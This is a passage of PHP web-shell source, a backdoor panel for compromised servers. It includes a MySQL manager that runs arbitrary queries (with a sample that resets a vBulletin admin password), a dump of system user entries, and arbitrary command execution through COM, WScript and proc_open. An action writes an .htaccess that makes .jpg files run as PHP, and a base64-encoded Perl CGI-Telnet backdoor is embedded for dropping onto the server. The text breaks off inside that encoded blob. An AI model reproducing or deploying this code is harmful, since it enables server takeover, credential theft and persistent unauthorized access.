        formhead(array(
            'title' => 'MYSQL Manager'
        ));
        makehide('action', 'sqladmin');
        p('<p>');
        p('DBHost:');
        makeinput(array(
            'name' => 'dbhost',
            'size' => 20,
            'value' => $dbhost
        ));
        p(':');
        makeinput(array(
            'name' => 'dbport',
            'size' => 4,
            'value' => $dbport
        ));
        p('DBUser:');
        makeinput(array(
            'name' => 'dbuser',
            'size' => 15,
            'value' => $dbuser
        ));
        p('DBPass:');
        makeinput(array(
            'name' => 'dbpass',
            'size' => 15,
            'value' => $dbpass
        ));
        p('DBCharset:');
        makeselect(array(
            'name' => 'charset',
            'option' => $charsets,
            'selected' => $charset
        ));
        makeinput(array(
            'name' => 'connect',
            'value' => 'Connect',
            'type' => 'submit',
            'class' => 'bt'
        ));
        p('</p>');
        formfoot();
    ?><script type="text/javascript">
    function editrecord(action, base64, tablename){
            if (action == 'del') {
                    if (!confirm('Is or isn\'t deletion record?')) return;
            }
            $('recordlist').doing.value=action;
            $('recordlist').base64.value=base64;
            $('recordlist').tablename.value=tablename;
            $('recordlist').submit();
    }
    function moddbname(dbname) {
            if(!dbname) return;
            $('setdbname').dbname.value=dbname;
            $('setdbname').submit();
    }
    function settable(tablename,doing,page) {
            if(!tablename) return;
            if (doing) {
                    $('settable').doing.value=doing;
            }
            if (page) {
                    $('settable').page.value=page;
            }
            $('settable').tablename.value=tablename;
            $('settable').submit();
    }
    </script>
    <?php
        formhead(array(
            'name' => 'recordlist'
        ));
        makehide('doing');
        makehide('action', 'sqladmin');
        makehide('base64');
        makehide('tablename');
        p($dbform);
        formfoot();
        formhead(array(
            'name' => 'setdbname'
        ));
        makehide('action', 'sqladmin');
        p($dbform);
        if (!$dbname) {
            makehide('dbname');
        }
        formfoot();
        formhead(array(
            'name' => 'settable'
        ));
        makehide('action', 'sqladmin');
        p($dbform);
        makehide('tablename');
        makehide('page', $page);
        makehide('doing');
        formfoot();
        $cachetables = array();
        $pagenum     = 30;
        $page        = intval($page);
        if ($page) {
            $start_limit = ($page - 1) * $pagenum;
        } else {
            $start_limit = 0;
            $page        = 1;
        }
        if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
            dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            // get mysql server
            $mysqlver = mysql_get_server_info();
            p('<p>MySQL ' . $mysqlver . ' running in ' . $dbhost . ' as ' . $dbuser . '@' . $dbhost . '</p>');
            $highver = $mysqlver > '4.1' ? 1 : 0;
           
            // Show database
            $query = q("SHOW DATABASES");
            $dbs   = array();
            $dbs[] = '-- Select a database --';
            while ($db = mysql_fetch_array($query)) {
                $dbs[$db['Database']] = $db['Database'];
            }
            makeselect(array(
                'title' => 'Please select a database:',
                'name' => 'db[]',
                'option' => $dbs,
                'selected' => $dbname,
                'onchange' => 'moddbname(this.options[this.selectedIndex].value)',
                'newline' => 1
            ));
            $tabledb = array();
            if ($dbname) {
                p('<p>');
                p('Current dababase: <a href="javascript:moddbname(\'' . $dbname . '\');">' . $dbname . '</a>');
                if ($tablename) {
                    p(' | Current Table: <a href="javascript:settable(\'' . $tablename . '\');">' . $tablename . '</a> [ <a href="javascript:settable(\'' . $tablename . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $tablename . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $tablename . '\', \'drop\');">Drop</a> ]');
                }
                p('</p>');
                mysql_select_db($dbname);
               
                $getnumsql = '';
                $runquery  = 0;
                if ($sql_query) {
                    $runquery = 1;
                }
                $allowedit = 0;
                if ($tablename && !$sql_query) {
                    $sql_query = "SELECT * FROM $tablename";
                    $getnumsql = $sql_query;
                    $sql_query = $sql_query . " LIMIT $start_limit, $pagenum";
                    $allowedit = 1;
                }
                p('<form action="' . $self . '" method="POST">');
                p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database <font color=red><b>' . $dbname . '</font></b>:<BR>Example VBB Password: <font color=red>KyoBin</font><BR><font color=yellow>UPDATE `user` SET `password` = \'69e53e5ab9536e55d31ff533aefc4fbe\', salt = \'p5T\' WHERE `userid` = \'1\' </font>
                            </td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">' . htmlspecialchars($sql_query, ENT_QUOTES) . '</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
                makehide('tablename', $tablename);
                makehide('action', 'sqladmin');
                p($dbform);
                p('</form>');
                if ($tablename || ($runquery && $sql_query)) {
                    if ($doing == 'structure') {
                        $result = q("SHOW COLUMNS FROM $tablename");
                        $rowdb  = array();
                        while ($row = mysql_fetch_array($result)) {
                            $rowdb[] = $row;
                        }
                        p('<table border="0" cellpadding="3" cellspacing="0">');
                        p('<tr class="head">');
                        p('<td>Field</td>');
                        p('<td>Type</td>');
                        p('<td>Null</td>');
                        p('<td>Key</td>');
                        p('<td>Default</td>');
                        p('<td>Extra</td>');
                        p('</tr>');
                        foreach ($rowdb as $row) {
                            $thisbg = bg();
                            p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                            p('<td>' . $row['Field'] . '</td>');
                            p('<td>' . $row['Type'] . '</td>');
                            p('<td>' . $row['Null'] . '&nbsp;</td>');
                            p('<td>' . $row['Key'] . '&nbsp;</td>');
                            p('<td>' . $row['Default'] . '&nbsp;</td>');
                            p('<td>' . $row['Extra'] . '&nbsp;</td>');
                            p('</tr>');
                        }
                        tbfoot();
                    } elseif ($doing == 'insert' || $doing == 'edit') {
                        $result = q('SHOW COLUMNS FROM ' . $tablename);
                        while ($row = mysql_fetch_array($result)) {
                            $rowdb[] = $row;
                        }
                        $rs = array();
                        if ($doing == 'insert') {
                            p('<h2>Insert new line in ' . $tablename . ' table &raquo;</h2>');
                        } else {
                            p('<h2>Update record in ' . $tablename . ' table &raquo;</h2>');
                            $where  = base64_decode($base64);
                            $result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
                            $rs     = mysql_fetch_array($result);
                        }
                        p('<form method="post" action="' . $self . '">');
                        p($dbform);
                        makehide('action', 'sqladmin');
                        makehide('tablename', $tablename);
                        p('<table border="0" cellpadding="3" cellspacing="0">');
                        foreach ($rowdb as $row) {
                            if ($rs[$row['Field']]) {
                                $value = htmlspecialchars($rs[$row['Field']]);
                            } else {
                                $value = '';
                            }
                            $thisbg = bg();
                            p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                            p('<td><b>' . $row['Field'] . '</b><br />' . $row['Type'] . '</td><td><textarea class="area" name="insertsql[' . $row['Field'] . ']" style="width:500px;height:60px;overflow:auto;">' . $value . '</textarea></td></tr>');
                        }
                        if ($doing == 'insert') {
                            p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
                        } else {
                            p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
                            makehide('base64', $base64);
                        }
                        p('</table></form>');
                    } else {
                        $querys = @explode(';', $sql_query);
                        foreach ($querys as $num => $query) {
                            if ($query) {
                                p("<p><b>Query#{$num} : " . htmlspecialchars($query, ENT_QUOTES) . "</b></p>");
                                switch (qy($query)) {
                                    case 0:
                                        p('<h2>Error : ' . mysql_error() . '</h2>');
                                        break;
                                    case 1:
                                        if (strtolower(substr($query, 0, 13)) == 'select * from') {
                                            $allowedit = 1;
                                        }
                                        if ($getnumsql) {
                                            $tatol     = mysql_num_rows(q($getnumsql));
                                            $multipage = multi($tatol, $pagenum, $page, $tablename);
                                        }
                                        if (!$tablename) {
                                            $sql_line = str_replace(array(
                                                "\r",
                                                "\n",
                                                "\t"
                                            ), array(
                                                ' ',
                                                ' ',
                                                ' '
                                            ), trim(htmlspecialchars($query)));
                                            $sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
                                            preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i", $sql_line, $matches);
                                            $tablename = $matches[1][0];
                                        }
                                        $result = q($query);
                                        p($multipage);
                                        p('<table border="0" cellpadding="3" cellspacing="0">');
                                        p('<tr class="head">');
                                        if ($allowedit)
                                            p('<td>Action</td>');
                                        $fieldnum = @mysql_num_fields($result);
                                        for ($i = 0; $i < $fieldnum; $i++) {
                                            $name = @mysql_field_name($result, $i);
                                            $type = @mysql_field_type($result, $i);
                                            $len  = @mysql_field_len($result, $i);
                                            p("<td nowrap>$name<br><span>$type($len)</span></td>");
                                        }
                                        p('</tr>');
                                        while ($mn = @mysql_fetch_assoc($result)) {
                                            $thisbg = bg();
                                            p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                                            $where = $tmp = $b1 = '';
                                            foreach ($mn as $key => $inside) {
                                                if ($inside) {
                                                    $where .= $tmp . $key . "='" . addslashes($inside) . "'";
                                                    $tmp = ' AND ';
                                                }
                                                $b1 .= '<td nowrap>' . html_clean($inside) . '&nbsp;</td>';
                                            }
                                            $where = base64_encode($where);
                                            if ($allowedit)
                                                p('<td nowrap><a href="javascript:editrecord(\'edit\', \'' . $where . '\', \'' . $tablename . '\');">Edit</a> | <a href="javascript:editrecord(\'del\', \'' . $where . '\', \'' . $tablename . '\');">Del</a></td>');
                                            p($b1);
                                            p('</tr>');
                                            unset($b1);
                                        }
                                        tbfoot();
                                        p($multipage);
                                        break;
                                    case 2:
                                        $ar = mysql_affected_rows();
                                        p('<h2>affected rows : <b>' . $ar . '</b></h2>');
                                        break;
                                }
                            }
                        }
                    }
                } else {
                    $query     = q("SHOW TABLE STATUS");
                    $table_num = $table_rows = $data_size = 0;
                    $tabledb   = array();
                    while ($table = mysql_fetch_array($query)) {
                        $data_size            = $data_size + $table['Data_length'];
                        $table_rows           = $table_rows + $table['Rows'];
                        $table['Data_length'] = sizecount($table['Data_length']);
                        $table_num++;
                        $tabledb[] = $table;
                    }
                    $data_size = sizecount($data_size);
                    unset($table);
                    p('<table border="0" cellpadding="0" cellspacing="0">');
                    p('<form action="' . $self . '" method="POST">');
                    makehide('action', 'sqladmin');
                    p($dbform);
                    p('<tr class="head">');
                    p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
                    p('<td>Name</td>');
                    p('<td>Rows</td>');
                    p('<td>Data_length</td>');
                    p('<td>Create_time</td>');
                    p('<td>Update_time</td>');
                    if ($highver) {
                        p('<td>Engine</td>');
                        p('<td>Collation</td>');
                    }
                    p('</tr>');
                    foreach ($tabledb as $key => $table) {
                        $thisbg = bg();
                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                        p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="' . $table['Name'] . '" /></td>');
                        p('<td><a href="javascript:settable(\'' . $table['Name'] . '\');">' . $table['Name'] . '</a> [ <a href="javascript:settable(\'' . $table['Name'] . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $table['Name'] . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $table['Name'] . '\', \'drop\');">Drop</a> ]</td>');
                        p('<td>' . $table['Rows'] . '</td>');
                        p('<td>' . $table['Data_length'] . '</td>');
                        p('<td>' . $table['Create_time'] . '</td>');
                        p('<td>' . $table['Update_time'] . '</td>');
                        if ($highver) {
                            p('<td>' . $table['Engine'] . '</td>');
                            p('<td>' . $table['Collation'] . '</td>');
                        }
                        p('</tr>');
                    }
                    p('<tr class=fout>');
                    p('<td>&nbsp;</td>');
                    p('<td>Total tables: ' . $table_num . '</td>');
                    p('<td>' . $table_rows . '</td>');
                    p('<td>' . $data_size . '</td>');
                    p('<td colspan="' . ($highver ? 4 : 2) . '">&nbsp;</td>');
                    p('</tr>');
                   
                    p("<tr class=\"fout\"><td colspan=\"" . ($highver ? 8 : 6) . "\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"" . SA_ROOT . $_SERVER['HTTP_HOST'] . "_MySQL.sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Export selection table\" /></td></tr>");
                    makehide('doing', 'backupmysql');
                    formfoot();
                    p("</table>");
                    fr($query);
                }
            }
        }
        tbfoot();
        @mysql_close();
    } elseif ($action == 'etcpwd') {
        formhead(array(
            'title' => 'Get /etc/passwd'
        ));
        makehide('action', 'etcpwd');
        makehide('dir', $nowpath);
        $i = 0;
        echo "<p><br><textarea class=\area\ id=\phpcodexxx\ name=\phpcodexxx\ cols=\100\ rows=\25\>";
        while ($i < 60000) {
            $line = posix_getpwuid($i);
            if (!empty($line)) {
                while (list($key, $vba_etcpwd) = each($line)) {
                    echo "" . $vba_etcpwd . "
    ";
                    break;
                }
            }
            $i++;
        }
        echo "</textarea></p>";
        formfoot();
    } elseif ($action == 'command') {
        if (IS_WIN && IS_COM) {
            if ($program && $parameter) {
                $shell = new COM('Shell.Application');
                $a     = $shell->ShellExecute($program, $parameter);
                m('Program run has ' . (!$a ? 'success' : 'fail'));
            }
            !$program && $program = 'c:\indows\ystem32\md.exe';
            !$parameter && $parameter = '/c net start > ' . SA_ROOT . 'log.txt';
            formhead(array(
                'title' => 'Execute Program'
            ));
            makehide('action', 'shell');
            makeinput(array(
                'title' => 'Program',
                'name' => 'program',
                'value' => $program,
                'newline' => 1
            ));
            p('<p>');
            makeinput(array(
                'title' => 'Parameter',
                'name' => 'parameter',
                'value' => $parameter
            ));
            makeinput(array(
                'name' => 'submit',
                'class' => 'bt',
                'type' => 'submit',
                'value' => 'Execute'
            ));
            p('</p>');
            formfoot();
        }
        formhead(array(
            'title' => 'Execute Command'
        ));
        makehide('action', 'shell');
        if (IS_WIN && IS_COM) {
            $execfuncdb = array(
                'phpfunc' => 'phpfunc',
                'wscript' => 'wscript',
                'proc_open' => 'proc_open'
            );
            makeselect(array(
                'title' => 'Use:',
                'name' => 'execfunc',
                'option' => $execfuncdb,
                'selected' => $execfunc,
                'newline' => 1
            ));
        }
        p('<p>');
        makeinput(array(
            'title' => 'Command',
            'name' => 'command',
            'value' => $command
        ));
        makeinput(array(
            'name' => 'submit',
            'class' => 'bt',
            'type' => 'submit',
            'value' => 'Execute'
        ));
        p('</p>');
        formfoot();
        if ($command) {
            p('<hr width="100%" noshade /><pre>');
            if ($execfunc == 'wscript' && IS_WIN && IS_COM) {
                $wsh       = new COM('WScript.shell');
                $exec      = $wsh->exec('cmd.exe /c ' . $command);
                $stdout    = $exec->StdOut();
                $stroutput = $stdout->ReadAll();
                echo $stroutput;
            } elseif ($execfunc == 'proc_open' && IS_WIN && IS_COM) {
                $descriptorspec = array(
                    0 => array(
                        'pipe',
                        'r'
                    ),
                    1 => array(
                        'pipe',
                        'w'
                    ),
                    2 => array(
                        'pipe',
                        'w'
                    )
                );
                $process        = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
                if (is_resource($process)) {
                    fwrite($pipes[0], $command . "
    ");
                    fwrite($pipes[0], "exit
    ");
                    fclose($pipes[0]);
                    while (!feof($pipes[1])) {
                        echo fgets($pipes[1], 1024);
                    }
                    fclose($pipes[1]);
                    while (!feof($pipes[2])) {
                        echo fgets($pipes[2], 1024);
                    }
                    fclose($pipes[2]);
                    proc_close($process);
                }
            } else {
                echo (execute($command));
            }
            p('</pre>');
        }
    } elseif ($action == 'error.log') {
        mkdir('error', 0755);
        chdir('error');
        $kokdosya  = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen($dosya_adi, 'w') or die("Can not open file!");
        $metin = "Options +FollowSymLinks +Indexes
    DirectoryIndex default.html
    ## START ##
    Options +ExecCGI
    AddHandler cgi-script log cgi pl tg love h4 tgb x-zone
    AddType application/x-httpd-php .jpg
    RewriteEngine on
    RewriteRule (.*)\war$ .log
    ## END ##";
        fwrite($dosya, $metin);
        fclose($dosya);
        $pythonp = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS40IjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDI1NSwgMCwgMCksIDBweCAwcHggNXB4IHJnYigyNTUsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+Y0xvd048L2ZvbnQ+IjsNCg0KJFBhc3N3b3JkID0gIjQ5MTYyNSI7CQkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzDQoJCQkJIyB0byBsb2dpbi4NCnN1YiBJc19XaW4oKXsNCgkkb3MgPSAmdHJpbSgkRU5WeyJTRVJWRVJfU09GVFdBUkUifSk7DQoJaWYoJG9zID1+IG0vd2luL2kpew0KCQlyZXR1cm4gMTsNCgl9ZWxzZXsNCgkJcmV0dXJuIDA7DQoJfQ0KfQ0KJFdpbk5UID0gJklzX1dpbigpOwkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYNCgkJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQNCgkJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBvbiBVbml4LCB5b3UNCgkJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLg0KDQokTlRDbWRTZXAgPSAiJiI7CQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNlcCA9ICI7IjsJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CQkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxlZA0KCQkJCQkjIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcw0KCQkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJCSMgdGFrZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcw0KCQkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlDQoJCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlDQoJCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQNCgkJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQokY29scz0gMTMwOw0KJHJvd3M9IDI2Ow0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0DQojIHBhcnNlcyBHRVQsIFBPU1QgYW5kIG11bHRpcGFydC9mb3JtLWRhdGEgdGhhdCBpcyB1c2VkIGZvciB1cGxvYWRpbmcgZmlsZXMuDQojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uDQojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mDQojIHRoZSB2YXJpYWJsZS4gTm90ZTogTW9zdCBvZiB0aGUgY29kZSBpbiB0aGlzIGZ1bmN0aW9uIGlzIHRha2VuIGZyb20gb3RoZXIgQ0dJDQojIHNjcmlwdHMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUmVhZFBhcnNlIA0Kew0KCWxvY2FsICgqaW4pID0gQF8gaWYgQF87DQoJbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0KCQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGldID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgZnVuY3Rpb24gRW5jb2RlRGlyOiBlbmNvZGUgYmFzZTY0IFBhdGgNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFbmNvZGVEaXINCnsNCglteSAkZGlyID0gc2hpZnQ7DQoJJGRpciA9IHRyaW0oZW5jb2RlX2Jhc2U2NCgkZGlyKSk7DQoJJGRpciA9fiBzLyhccnxcbikvLzsNCglyZXR1cm4gJGRpcjsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyDQojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBzZXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VIZWFkZXINCnsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJbXkgJGlkID0gYGlkYCBpZighJFdpbk5UKTsNCglteSAkaW5mbyA9IGB1bmFtZSAtcyAtbiAtciAtaWA7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPg0KPHRpdGxlPiRFTlZ7J1NFUlZFUl9OQU1FJ30gfCBJUCA6ICRFTlZ7J1NFUlZFUl9BRERSJ30gPC90aXRsZT4NCiRIdG1sTWV0YUhlYWRlcg0KPC9oZWFkPg0KPHN0eWxlPg0KYm9keXsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCmNvbG9yOiAjZmZmOw0KfQ0KdHIsdGQsdGFibGUsaW5wdXQsdGV4dGFyZWEgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQp9DQojZG9tYWluIHRyOmhvdmVyew0KYmFja2dyb3VuZC1jb2xvcjogIzQ0NDsNCn0NCnRkIHsNCmNvbG9yOiAjZmZmZmZmOw0KfQ0KLmxpc3RkaXIgdGR7DQoJdGV4dC1hbGlnbjogY2VudGVyOw0KfQ0KLmxpc3RkaXIgdGh7DQoJY29sb3I6ICNGRjk5MDA7DQp9DQouZGlyLC5maWxlDQp7DQoJdGV4dC1hbGlnbjogbGVmdCAhaW1wb3J0YW50Ow0KfQ0KLmRpcnsNCglmb250LXNpemU6IDEwcHQ7IA0KCWZvbnQtd2VpZ2h0OiBib2xkOw0KfQ0KdGFibGUgew0KQkFDS0dST1VORC1DT0xPUjogIzExMTsNCn0NCmlucHV0IHsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KY29sb3I6ICNmZjk5MDA7DQp9DQppbnB1dC5zdWJtaXQgew0KdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCA